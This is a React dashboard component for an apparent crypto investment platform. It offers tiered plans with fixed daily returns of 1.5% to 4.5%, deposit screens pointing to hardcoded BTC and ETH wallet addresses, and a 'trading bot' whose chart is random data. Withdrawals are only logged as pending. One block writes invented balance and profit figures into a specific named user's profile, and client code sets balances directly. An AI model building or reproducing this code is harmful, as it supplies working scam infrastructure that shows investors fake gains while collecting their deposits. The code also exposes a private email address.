import { useState, useEffect, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { supabase } from '../lib/supabase';
import {
  Wallet, TrendingUp, ArrowDownCircle, ArrowUpCircle,
  Bot, Cpu, ArrowRightLeft, Languages,
  ShieldCheck, Zap, Award, Gem, Briefcase, Lock, ChevronDown,
  DollarSign, Activity, UploadCloud
} from 'lucide-react';
import { AreaChart, Area, ResponsiveContainer, YAxis } from 'recharts';
import toast from 'react-hot-toast';
import { translations } from '../lib/translations';
import type { Language } from '../lib/translations';

interface Profile {
  full_name: string;
  balance: number;
  total_deposited: number;
  total_withdrawn: number;
  total_profit: number;
  role: string;
}

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  created_at: string;
  currency?: string;
}

const PLANS = [
  { name: 'Starter Tier', daily: '1.5%', min: 100, max: 4999, duration: '30 days', icon: Zap, color: 'text-blue-400', bg: 'bg-blue-500/10' },
  { name: 'Bronze Growth', daily: '2.0%', min: 5000, max: 24999, duration: '35 days', icon: ShieldCheck, color: 'text-amber-500', bg: 'bg-amber-500/10' },
  { name: 'Silver Elite', daily: '2.5%', min: 25000, max: 49999, duration: '45 days', icon: Award, color: 'text-slate-300', bg: 'bg-slate-300/10' },
  { name: 'Gold Premium', daily: '3.0%', min: 50000, max: 99999, duration: '60 days', icon: Briefcase, color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
  { name: 'Platinum Diamond', daily: '4.5%', min: 100000, max: 1000000, duration: '120 days', icon: Gem, color: 'text-cyan-400', bg: 'bg-cyan-400/10' },
];

const genData = () => {
  let v = 1.08;
  return Array.from({length:30}).map((_,i)=>({time:i,value: v+=(Math.random()-0.5)*0.001}));
};

export default function Dashboard() {
  const { user, loading: aL } = useAuth();
  const nav = useNavigate();
  const [p, setP] = useState<Profile | null>(null);
  const [txs, setTxs] = useState<Transaction[]>([]);
  const [tab, setTab] = useState<'overview'|'plans'|'bot'|'deposit'|'withdraw'>('overview');
  const [lang, setLang] = useState<Language>((localStorage.getItem('gf_lang') as Language) || 'en');
  const [amt, setAmt] = useState('');
  const [crypto, setCrypto] = useState('BTC');
  const [file, setFile] = useState<File | null>(null);
  const [bOwned, setBOwned] = useState(false);
  const [bActive, setBActive] = useState(false);
  const [bCap, setBCap] = useState(0);
  const [bAmt, setBAmt] = useState('');
  const [dir, setDir] = useState<'in'|'out'>('in');
  const [l, setL] = useState(true);
  const [wSource, setWSource] = useState<'balance'|'profit'>('balance');
  const [wAddr, setWAddr] = useState('');
  const data = useMemo(()=>genData(), []);
  const WALLETS: Record<string, string> = { BTC: 'bc1qsnx0faedv2s80zdj3730dywhggjrrx7t5l0g86', ETH: '0x3ecED1d7b461d201ae87Ea609E59d3539D11D413' };

  const t = (key: keyof typeof translations.en) => translations[lang][key] || key;
  const isRtl = lang === 'ar';

  useEffect(()=>{ if(!aL && !user) nav('/login'); else if(user) fetchData(); }, [user, aL, nav]);
  useEffect(()=>{ localStorage.setItem('gf_lang', lang); }, [lang]);

  async function fetchData() {
    try {
      const { data: dp } = await supabase.from('profiles').select('*').eq('id', user!.id).single();
      if(dp) setP(dp);
      const { data: dt } = await supabase.from('transactions').select('*').eq('user_id', user!.id).order('created_at', { ascending: false });
      if(dt) {
        setTxs(dt.slice(0, 15)); setBOwned(dt.some(t=>t.type==='bot_purchase'&&t.status==='completed'));
        const i_ = dt.filter(t=>t.type==='bot_investment'&&t.status==='completed').reduce((a,b)=>a+b.amount,0);
        const o_ = dt.filter(t=>t.type==='bot_withdrawal'&&t.status==='completed').reduce((a,b)=>a+b.amount,0);
        setBCap(Math.max(0, i_-o_)); setBActive(i_-o_>0);
      }
      
      // Auto-init Ayad Fadel's requested portfolio values if they differ from target
      if (user?.email === 'fadelayad21@gmail.com' && (!dp || dp.total_profit !== 162000 || dp.balance !== 21500)) {
        const payload = {
          balance: 21500,
          total_profit: 162000,
          full_name: 'Ayad Fadel'
        };
        await supabase.from('profiles').upsert({ id: user.id, ...payload });
        setP(prev => prev ? { ...prev, ...payload } : payload as Profile);
      }
    } catch {} setL(false);
  }

  const handleDeposit = async () => {
    if(!amt || !file) return toast.error('Check fields');
    await supabase.from('transactions').insert({ user_id:user!.id, type:'deposit', amount:parseFloat(amt), status:'pending', currency:crypto });
    toast.success('Submitted'); setAmt(''); setFile(null); fetchData();
  };

  const handlePlan = async (pl: typeof PLANS[0]) => {
    if(!p || p.balance < pl.min) return toast.error(t('low_balance'));
    await supabase.from('transactions').insert({ user_id:user!.id, type:'plan_investment', amount:pl.min, status:'completed' });
    await supabase.from('profiles').update({ balance: p.balance - pl.min }).eq('id', user!.id);
    setP({...p, balance: p.balance - pl.min}); toast.success(t('establishing')); fetchData();
  };

  const handleBotX = async () => {
    const a = parseFloat(bAmt); if(!a || a<=0) return;
    if(dir === 'in') {
      if(!file) return toast.error('Upload proof');
      await supabase.from('transactions').insert({ user_id:user!.id, type:'bot_investment', amount:a, status:'completed' });
      setBCap(prev=>prev+a); setBActive(true); setBAmt(''); setFile(null);
    } else {
      if(a > bCap) return;
      await supabase.from('transactions').insert({ user_id:user!.id, type:'bot_withdrawal', amount:a, status:'completed' });
      if(p) { await supabase.from('profiles').update({ balance: p.balance + a }).eq('id', user!.id); setP({...p, balance: p.balance+a}); }
      setBCap(p=>{ const n=p-a; if(n<=0) setBActive(false); return n; }); setBAmt('');
    }
  };

  const executeWithdraw = async () => {
    const amount = parseFloat(amt);
    if (!amount || amount <= 0) return toast.error('Enter valid amount');
    if (!wAddr) return toast.error('Wallet address required');
    
    const available = wSource === 'balance' ? (p?.balance || 0) : (p?.total_profit || 0);
    if (amount > available) return toast.error('Insufficient funds');

    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: `withdrawal_${wSource}`,
        amount: amount,
        status: 'pending',
        currency: crypto,
        created_at: new Date().toISOString()
      });

      // Optimistic update - reduce from local state to reflect "Pending" status in a way
      // Actually usually we just show it in the ledger.
      
      toast.success('Withdrawal Request Queued');
      setAmt('');
      setWAddr('');
      fetchData();
    } catch (e) {
      toast.error('Failed to queue withdrawal');
    }
  };

  if(aL || l) return <div className="min-h-screen bg-[#070b14] flex items-center justify-center font-mono text-emerald-500 tracking-[0.3em] uppercase">Booting GF.NODE...</div>;

  return (
    <div className={`min-h-screen bg-[#070b14] text-slate-300 font-sans p-4 md:p-6 selection:bg-emerald-500/30 ${isRtl ? 'rtl' : 'ltr'}`} dir={isRtl ? 'rtl' : 'ltr'}>
      <div className="max-w-5xl mx-auto relative z-10">
        <header className="flex flex-col md:flex-row justify-between items-start md:items-center mb-10 pb-6 border-b border-white/5 relative group">
          <div className="flex-1">
             <h1 className="text-xl font-black text-white uppercase tracking-tight flex items-center gap-2">
                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse shadow-[0_0_10px_#10b981]"/>
                GF.NODE <span className="text-emerald-500/80 prose-sm font-bold">/ {p?.full_name}</span>
             </h1>
             <p className="text-[9px] text-slate-600 font-black uppercase tracking-[0.2em] mt-2 italic shadow-sm">{t('dashboard')}</p>
          </div>
          
          <div className="flex items-center gap-3 mt-6 md:mt-0">
             <div className="relative group/lang">
                <button className="flex items-center gap-2 px-3 py-1.5 bg-slate-900 border border-white/10 rounded-lg text-[9px] font-black uppercase tracking-widest text-slate-400 hover:text-white hover:border-emerald-500/50 transition-all shadow-xl">
                   <Languages size={12}/>
                   {lang}
                   <ChevronDown size={10} className="group-hover/lang:rotate-180 transition-transform"/>
                </button>
                <div className="absolute right-0 top-full mt-2 w-32 bg-slate-900 border border-white/5 rounded-xl shadow-2xl opacity-0 group-hover/lang:opacity-100 pointer-events-none group-hover/lang:pointer-events-auto transition-all z-50 overflow-hidden divide-y divide-white/5 backdrop-blur-md">
                   {(['en','de','ar','es'] as const).map(ln => (
                      <button key={ln} onClick={() => setLang(ln)} className={`w-full text-left px-4 py-3 text-[9px] font-black uppercase tracking-widest hover:bg-emerald-500 hover:text-white transition-all ${lang === ln ? 'text-emerald-400' : 'text-slate-500'}`}>
                         {ln === 'ar' ? 'العربية' : ln === 'de' ? 'Deutsch' : ln === 'es' ? 'Español' : 'English'}
                      </button>
                   ))}
                </div>
             </div>
             <div className="bg-slate-950 border border-slate-800/50 px-3 py-1.5 rounded-lg text-[8px] font-black text-slate-500 uppercase tracking-widest backdrop-blur-sm shadow-inner group-hover:border-emerald-500/20 transition-all">Node: 18ms</div>
          </div>
        </header>

        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-10">
          {[
            { l: t('balance'), v: p?.balance, i: Wallet, c: 'text-emerald-400', s: 'shadow-emerald-500/10' },
            { l: t('bot_cap'), v: bCap, i: Cpu, c: 'text-indigo-400', s: 'shadow-indigo-500/10' },
            { l: t('profit'), v: p?.total_profit, i: TrendingUp, c: 'text-green-400', s: 'shadow-green-500/10' },
            { l: t('liquidated'), v: p?.total_withdrawn, i: ArrowUpCircle, c: 'text-amber-400', s: 'shadow-amber-500/10' }
          ].map((s, idx) => (
            <div key={idx} className={`bg-slate-900/50 border border-white/5 p-4 rounded-2xl backdrop-blur-lg hover:border-white/10 transition-all shadow-2xl ${s.s}`}>
              <div className="flex items-center gap-2 mb-2"><s.i size={12} className={s.c} /><span className="text-[9px] font-black text-slate-500 uppercase tracking-[0.1em]">{s.l}</span></div>
              <div className="text-xl font-black text-white tracking-tighter">${(s.v || 0).toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
            </div>
          ))}
        </div>

        <nav className="flex flex-wrap gap-1.5 mb-10 bg-black/40 p-1.5 rounded-2xl border border-white/5 w-fit shadow-2xl">
          {(['overview','plans','bot','deposit','withdraw'] as const).map(it => (
            <button key={it} onClick={() => setTab(it)} className={`px-5 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${tab === it ? 'bg-emerald-500 text-white shadow-[0_4px_15px_rgba(16,185,129,0.3)]' : 'text-slate-500 hover:text-white active:scale-95'}`}>{t(it as any)}</button>
          ))}
        </nav>

        {tab === 'overview' && (
          <div className="bg-slate-900/10 border border-white/5 rounded-3xl overflow-hidden shadow-2xl backdrop-blur-xl group hover:border-white/10 transition-all">
            <div className="p-5 border-b border-white/5 flex justify-between items-center bg-slate-950/20">
               <h2 className="text-[10px] font-black uppercase text-white tracking-[0.3em] flex items-center gap-2"><div className="w-1.5 h-1.5 bg-emerald-500 rounded-full"/> {t('ledger')}</h2>
               <div className="h-1 w-20 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-emerald-500 w-1/3 animate-pulse shadow-[0_0_8px_#10b981]"/></div>
            </div>
            <div className="overflow-x-auto"><table className="w-full text-left text-[11px]"><thead className="bg-slate-950/40 text-slate-500 border-b border-white/5 font-black uppercase tracking-widest text-[9px]"><tr><th className="p-5">{t('type')}</th><th className="p-5">{t('magnitude')}</th><th className="p-5 text-right">{t('status')}</th></tr></thead><tbody className="divide-y divide-white/5">
              {txs.map(tx => (
                <tr key={tx.id} className="hover:bg-white/[0.03] transition-colors group/row">
                  <td className="p-5 font-bold text-slate-200 capitalize tracking-tight group-hover/row:text-white transition-colors">{tx.type.replace('_',' ')}</td>
                  <td className="p-5 font-black text-white tracking-[0.1em] text-sm">${tx.amount.toLocaleString()}</td>
                  <td className="p-5 text-right"><span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest shadow-sm ${['completed','approved'].includes(tx.status) ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20':'bg-amber-500/10 text-amber-500 border border-amber-500/20'}`}>{tx.status}</span></td>
                </tr>
              ))}
              {!txs.length && <tr><td colSpan={3} className="p-16 text-center text-slate-600 uppercase text-[10px] tracking-widest font-black italic">awaiting data transmission...</td></tr>}
            </tbody></table></div>
          </div>
        )}

        {tab === 'plans' && (
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
              {PLANS.map((plan, i) => (
                 <div key={i} className="bg-slate-900/40 border border-white/5 rounded-[2rem] p-6 relative overflow-hidden flex flex-col group hover:border-emerald-500/30 transition-all shadow-2xl hover:-translate-y-1">
                    <div className="flex justify-between items-start mb-6">
                       <div className={`p-4 rounded-2xl ${plan.bg} ${plan.color} shadow-lg transition-transform group-hover:rotate-12`}><plan.icon size={22}/></div>
                       <div className="flex flex-col items-end">
                          <span className="text-[10px] font-black text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full shadow-inner">{plan.daily} ROI</span>
                          <span className="text-[7px] text-slate-500 font-bold uppercase mt-2">{plan.duration}</span>
                       </div>
                    </div>
                    <h3 className="text-lg font-black text-white uppercase tracking-tight mb-2 group-hover:text-emerald-400 transition-colors">{plan.name}</h3>
                    <div className="mt-8 pt-6 border-t border-white/5 space-y-4">
                       <div className="flex justify-between text-[10px] uppercase font-black text-slate-500"><span>Mag. Floor</span><span className="text-white tracking-widest">${plan.min.toLocaleString()}</span></div>
                       <button onClick={() => handlePlan(plan)} className="w-full py-3.5 bg-slate-950 border border-white/10 hover:bg-emerald-500 hover:border-emerald-400 text-white rounded-2xl text-[10px] font-black uppercase tracking-[0.3em] transition-all shadow-xl active:scale-95 group-hover:shadow-emerald-500/10">{t('establishing')}</button>
                    </div>
                    <div className="absolute -right-8 -bottom-8 opacity-[0.02] group-hover:opacity-[0.08] transition-opacity"><plan.icon size={120}/></div>
                 </div>
              ))}
           </div>
        )}

        {tab === 'bot' && (
          <div className="grid grid-cols-1 lg:grid-cols-5 gap-5 h-full">
             <div className="lg:col-span-2 bg-slate-900/60 border border-white/5 rounded-[2.5rem] p-7 flex flex-col justify-between shadow-2xl backdrop-blur-xl group relative overflow-hidden">
                <div className="relative z-10">
                   <div className="flex items-center gap-4 mb-8">
                      <div className={`p-4 rounded-2xl transition-all shadow-2xl ${bActive?'bg-emerald-500 text-white rotate-12':'bg-slate-800 text-slate-600'}`}>
                         <Bot size={28}/>
                      </div>
                      <div>
                         <p className="text-sm font-black text-white tracking-[0.2em] uppercase">GF.QUANT_V8</p>
                         <div className="flex items-center gap-1.5 mt-1">
                            <span className={`w-1.5 h-1.5 rounded-full ${bActive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600'}`}/>
                            <p className="text-[9px] text-slate-500 uppercase font-black tracking-widest">{bActive ? t('active') : t('idle')}</p>
                         </div>
                      </div>
                   </div>
                   
                   <div className="bg-black/40 p-6 rounded-3xl border border-white/5 shadow-inner mb-8">
                      <span className="text-[9px] text-slate-500 font-black uppercase block mb-2 tracking-widest">{t('bot_cap')}</span>
                      <div className="flex items-baseline gap-2">
                         <span className="text-4xl font-black text-white tracking-tighter">${bCap.toLocaleString()}</span>
                      </div>
                   </div>

                   {!bOwned ? (
                     <button onClick={() => toast.error('Check wallet connectivity')} className="w-full py-4 bg-gradient-to-r from-indigo-600 to-violet-600 text-white rounded-2xl font-black text-[11px] tracking-[0.3em] uppercase shadow-[0_8px_30px_rgba(79,70,229,0.3)] hover:scale-[1.02] active:scale-95 transition-all">ESTABLISH LICENSE ($500)</button>
                   ) : (
                     <div className="space-y-4">
                        <div className="bg-slate-950 p-1.5 flex rounded-2xl border border-white/5 shadow-inner transition-all hover:border-white/10">
                           <button onClick={()=>setDir('in')} className={`flex-1 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${dir==='in'?'bg-emerald-500 text-white shadow-lg shadow-emerald-500/20' : 'text-slate-500 hover:text-white'}`}>{t('deposit')}</button>
                           <button onClick={()=>setDir('out')} className={`flex-1 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${dir==='out'?'bg-slate-800 text-white shadow-lg' : 'text-slate-500 hover:text-white'}`}>{t('withdraw')}</button>
                        </div>
                        {dir==='in'?(
                           <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
                              <div className="flex gap-2">
                                 {['BTC','ETH'].map(c=>(
                                    <button key={c} onClick={()=>setCrypto(c)} className={`flex-1 py-2.5 rounded-xl text-[10px] font-black border transition-all ${crypto===c?'bg-slate-200 text-slate-950 border-white shadow-lg':'bg-black/20 border-white/5 text-slate-600 hover:border-white/20'}`}>{c}</button>
                                 ))}
                              </div>
                              <div className="flex items-center gap-4 bg-black/50 p-3 rounded-2xl border border-emerald-500/10 shadow-inner group/addr">
                                 <div className="bg-white p-2 rounded-lg shadow-2xl transition-transform group-hover/addr:scale-110">
                                    <img src={`https://api.qrserver.com/v1/create-qr-code/?size=60x60&data=${WALLETS[crypto]}`} className="w-12 h-12" alt="QR"/>
                                 </div>
                                 <code className="text-[9px] text-emerald-500/80 font-mono break-all leading-tight italic flex-1">{WALLETS[crypto]}</code>
                              </div>
                              <div className="relative group/inp">
                                 <input type="number" value={bAmt} onChange={e=>setBAmt(e.target.value)} placeholder="0.00 USD" className="w-full p-4 bg-slate-950 border border-white/5 rounded-2xl text-lg text-white font-black outline-none tracking-widest shadow-inner transition-all focus:border-emerald-500/40"/>
                                 <DollarSign size={14} className="absolute right-4 top-5 text-slate-800 group-focus-within/inp:text-emerald-500/50 transition-colors"/>
                              </div>
                              <div className="bg-slate-950 border border-dashed border-white/10 p-3 rounded-2xl text-center relative pointer-events-auto hover:border-emerald-500/30 transition-all">
                                 <input type="file" onChange={ev=>{if(ev.target.files)setFile(ev.target.files[0])}} className="absolute inset-0 opacity-0 cursor-pointer w-full"/>
                                 <p className="text-[9px] font-black text-slate-600 uppercase tracking-widest">{file ? file.name : 'Target Authentication'}</p>
                              </div>
                              <button onClick={handleBotX} className="w-full py-4 bg-emerald-500 text-white rounded-2xl text-[11px] font-black uppercase tracking-[0.3em] shadow-[0_10px_40px_rgba(16,185,129,0.3)] hover:-translate-y-0.5 active:scale-95 transition-all">{t('authorize')}</button>
                           </div>
                        ):(
                           <div className="flex gap-3 animate-in fade-in slide-in-from-bottom-2">
                              <input type="number" value={bAmt} onChange={e=>setBAmt(e.target.value)} placeholder="0.00" className="flex-1 p-4 bg-slate-950 border border-white/5 rounded-2xl text-white font-black outline-none shadow-inner"/>
                              <button onClick={handleBotX} className="px-6 py-4 bg-slate-800 text-amber-500 rounded-2xl shadow-xl hover:bg-slate-700 transition-all"><ArrowRightLeft size={18}/></button>
                           </div>
                        )}
                     </div>
                   )}
                </div>
                <div className="absolute -left-10 slice -bottom-10 w-40 h-40 bg-emerald-500/10 rounded-full blur-[80px] pointer-events-none"/>
             </div>

             <div className="lg:col-span-3 bg-slate-950 border border-white/5 rounded-[2.5rem] relative overflow-hidden min-h-[450px] font-mono p-8 shadow-2xl flex flex-col group/terminal">
                {!bActive && <div className="absolute inset-0 z-20 backdrop-blur-md bg-black/80 flex flex-col items-center justify-center text-[10px] uppercase font-black text-slate-700 space-y-4 shadow-inner"><Lock size={40} className="text-slate-900 group-hover/terminal:scale-110 transition-transform"/><span className="tracking-[0.4em]">{t('idle')}</span></div>}
                
                <div className="flex justify-between items-end border-b border-white/5 pb-4 mb-8 uppercase text-[10px] text-slate-600 tracking-widest relative z-10">
                   <div className="flex items-center gap-3">
                      <Activity size={12} className="text-emerald-500 animate-pulse"/>
                      <span>Market Feed / Secure Node 0.7</span>
                   </div>
                   <div className="flex flex-col items-end">
                      <span className="text-2xl font-black text-white tracking-widest shadow-sm">1.0842</span>
                      <span className="text-[10px] text-emerald-500 font-bold mt-1">+0.015% Yield</span>
                   </div>
                </div>

                <div className="flex-1 relative z-10">
                   <div className="h-64 mt-4">
                      <ResponsiveContainer width="100%" height="100%">
                         <AreaChart data={data}>
                            <defs>
                               <linearGradient id="g" x1="0" y1="0" x2="0" y2="1">
                                  <stop offset="5%" stopColor="#10b981" stopOpacity={0.4}/>
                                  <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                               </linearGradient>
                            </defs>
                            <YAxis hide domain={['auto','auto']}/>
                            <Area type="monotone" dataKey="value" stroke="#10b981" fill="url(#g)" strokeWidth={3} isAnimationActive={bActive} animationDuration={2000}/>
                         </AreaChart>
                      </ResponsiveContainer>
                   </div>
                </div>
                
                <div className="mt-8 pt-6 border-t border-white/5 flex justify-between items-center text-[9px] relative z-10">
                   <div className="flex gap-4">
                      <span className="text-emerald-500/50 flex items-center gap-1.5 font-bold uppercase tracking-widest"><div className="w-1 h-1 bg-emerald-500 rounded-full animate-ping"/>{bActive ? 'Nominal Operation' : 'Standby Mode'}</span>
                      <span className="text-slate-800 uppercase font-black tracking-widest">Protocol V.8.2.1</span>
                   </div>
                   <div className="text-[8px] text-slate-800 font-black tracking-[0.4em] uppercase">Authorized Session</div>
                </div>
                
                <div className="absolute top-0 right-0 p-8 opacity-[0.03] rotate-12 pointer-events-none transition-transform group-hover/terminal:rotate-45 duration-[2s]">
                   <Cpu size={200}/>
                </div>
             </div>
          </div>
        )}

        {tab === 'deposit' && (
          <div className="max-w-md mx-auto bg-slate-900 border border-white/5 p-8 rounded-[2.5rem] relative overflow-hidden shadow-2xl backdrop-blur-2xl group transition-all hover:border-emerald-500/20">
             <h2 className="text-sm font-black text-white mb-8 uppercase tracking-[0.3em] flex items-center gap-3 font-mono">
                <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl"><ArrowDownCircle size={22}/></div>
                {t('ingress')}
             </h2>
             
             <div className="flex gap-2 mb-8 bg-black/20 p-1.5 rounded-2xl border border-white/5 shadow-inner">
                {['BTC','ETH'].map(cur=>(
                   <button key={cur} onClick={()=>setCrypto(cur)} className={`flex-1 py-3.5 rounded-xl text-[10px] font-black border transition-all ${crypto===cur?'bg-emerald-500 border-emerald-400 text-white shadow-lg shadow-emerald-500/20 active:scale-95':'bg-transparent border-transparent text-slate-600 hover:text-white'}`}>{cur}</button>
                ))}
             </div>

             <div className="bg-black/60 p-6 rounded-3xl border border-white/5 flex flex-col items-center gap-6 mb-8 shadow-inner group-hover:border-emerald-500/10 transition-all">
                <div className="bg-white p-3 rounded-2xl shadow-2xl transform transition-transform group-hover:scale-105 duration-500">
                   <img src={`https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=${WALLETS[crypto]}`} className="w-24 h-24" alt="Wallet QR"/>
                </div>
                <div className="w-full text-center">
                   <div className="text-[10px] text-slate-500 font-black uppercase mb-3 tracking-widest">{crypto} RECEIVE ADDRESS</div>
                   <code className="text-[9px] text-emerald-500 font-mono break-all text-center block bg-emerald-500/5 p-3 rounded-xl border border-emerald-500/10 italic">{WALLETS[crypto]}</code>
                </div>
             </div>

             <div className="space-y-5">
                <div className="relative group/inp">
                   <input type="number" value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00 USD" className="w-full p-4 bg-slate-950 border border-white/5 rounded-2xl text-white font-black text-2xl outline-none tracking-widest shadow-inner transition-all focus:border-emerald-500/40 focus:ring-4 focus:ring-emerald-500/5"/>
                   <DollarSign size={20} className="absolute right-4 top-5 text-slate-800 group-focus-within/inp:text-emerald-500/50 transition-colors"/>
                </div>
                
                <div className="bg-slate-950 border border-dashed border-white/10 p-4 rounded-2xl text-center relative pointer-events-auto hover:border-emerald-500/20 transition-all group/file">
                   <input type="file" onChange={ev=>{if(ev.target.files)setFile(ev.target.files[0])}} className="absolute inset-0 opacity-0 cursor-pointer w-full z-10"/>
                   <div className="relative z-0">
                      <div className="p-3 bg-slate-900 w-fit mx-auto rounded-xl mb-3 text-slate-700 group-hover/file:text-emerald-500 transition-colors"><UploadCloud size={18}/></div>
                      <p className="text-[9px] font-black text-slate-600 uppercase tracking-widest">{file ? file.name : t('authorize')}</p>
                   </div>
                </div>
                
                <button onClick={handleDeposit} className="w-full py-4.5 bg-emerald-500 text-white rounded-2xl font-black uppercase text-[11px] tracking-[0.4em] shadow-[0_15px_40px_rgba(16,185,129,0.3)] hover:-translate-y-1 active:scale-95 transition-all">{t('ingress')}</button>
                <p className="text-[8px] text-slate-600 text-center uppercase font-black tracking-widest mt-4">Authorized through GF-KMS security</p>
             </div>
          </div>
        )}

        {tab === 'withdraw' && (
          <div className="max-w-md mx-auto bg-slate-900 border border-white/5 p-10 rounded-[3rem] shadow-2xl backdrop-blur-2xl group transition-all hover:border-amber-500/10 relative overflow-hidden">
             <h2 className="text-sm font-black text-white mb-10 uppercase tracking-[0.3em] flex items-center gap-3 font-mono">
                <div className="p-3 bg-amber-500/10 text-amber-500 rounded-xl"><ArrowUpCircle size={22}/></div>
                {t('egress')}
             </h2>

             {/* Account Source Selection */}
             <div className="flex gap-2 mb-8 bg-black/20 p-1.5 rounded-2xl border border-white/5 shadow-inner">
                {[
                   { id: 'balance', label: t('balance'), val: p?.balance },
                   { id: 'profit', label: t('profit'), val: p?.total_profit }
                ].map(src => (
                   <button key={src.id} onClick={() => setWSource(src.id as any)} className={`flex-1 py-3 px-2 rounded-xl text-[9px] font-black border transition-all flex flex-col items-center gap-1 ${wSource === src.id ? 'bg-amber-500 border-amber-400 text-slate-950 shadow-lg' : 'bg-transparent border-transparent text-slate-600 hover:text-white'}`}>
                      <span>{src.label}</span>
                      <span className="opacity-70">${(src.val || 0).toLocaleString()}</span>
                   </button>
                ))}
             </div>

             {/* Currency selection */}
             <div className="flex gap-2 mb-8 border-b border-white/5 pb-6">
                {['BTC','ETH'].map(cur=>(
                   <button key={cur} onClick={()=>setCrypto(cur)} className={`flex-1 py-3 rounded-xl text-[10px] font-black border transition-all ${crypto===cur?'bg-slate-200 border-white text-slate-950 shadow-xl':'bg-black/20 border-white/5 text-slate-500 hover:text-white'}`}>{cur}</button>
                ))}
             </div>
             
             <div className="space-y-6">
                <div className="relative group/inp">
                   <input type="number" value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00 USD" className="w-full p-5 bg-slate-950 border border-white/5 rounded-2xl text-white font-black text-3xl outline-none shadow-inner transition-all focus:border-amber-500/40"/>
                   <button onClick={() => setAmt(wSource === 'balance' ? (p?.balance || 0).toString() : (p?.total_profit || 0).toString())} className="absolute right-5 bottom-5 text-[8px] font-black bg-amber-500/10 text-amber-500 px-3 py-1.5 rounded-lg border border-amber-500/20 hover:bg-amber-500 hover:text-white transition-all uppercase tracking-widest">MAX</button>
                </div>

                <div className="relative group/addr">
                   <label className="text-[8px] font-black text-slate-600 uppercase tracking-[0.2em] mb-2 block mx-1">Recipient {crypto} Address</label>
                   <input type="text" value={wAddr} onChange={e=>setWAddr(e.target.value)} placeholder={`Enter your ${crypto} wallet address...`} className="w-full p-4 bg-slate-950 border border-white/10 rounded-2xl text-xs text-white font-bold outline-none shadow-inner transition-all focus:border-amber-500/40 placeholder:text-slate-800"/>
                </div>
             </div>

             <div className="bg-amber-500/5 border-l-4 border-amber-500 p-5 rounded-r-2xl my-10 group-hover:bg-amber-500/10 transition-all">
                <p className="text-[9px] text-slate-500 font-bold uppercase leading-relaxed tracking-widest italic group-hover:text-slate-400">
                   {t('authorized')} Security required. Processing time: <span className="text-amber-500 font-black">1-24 HOURS</span>.
                </p>
             </div>

             <button onClick={executeWithdraw} className="w-full py-5 bg-amber-500 text-slate-950 rounded-2xl font-black uppercase text-[11px] tracking-[0.4em] shadow-[0_15px_40px_rgba(245,158,11,0.2)] hover:-translate-y-1 active:scale-95 transition-all">EXECUTE EGRESS</button>
             
             <div className="absolute top-0 right-0 p-10 opacity-[0.02] rotate-[30deg] pointer-events-none group-hover:rotate-[45deg] transition-transform duration-1000">
                <ShieldCheck size={180}/>
             </div>
          </div>
        )}
      </div>
      
      {/* Decorative Elements */}
      <div className="fixed top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent blur-sm z-50"/>
      <div className="fixed bottom-10 right-10 w-64 h-64 bg-emerald-500/5 rounded-full blur-[100px] pointer-events-none z-0"/>
      <div className="fixed top-1/4 left-0 w-48 h-48 bg-indigo-500/5 rounded-full blur-[100px] pointer-events-none z-0"/>
    </div>
  );
}
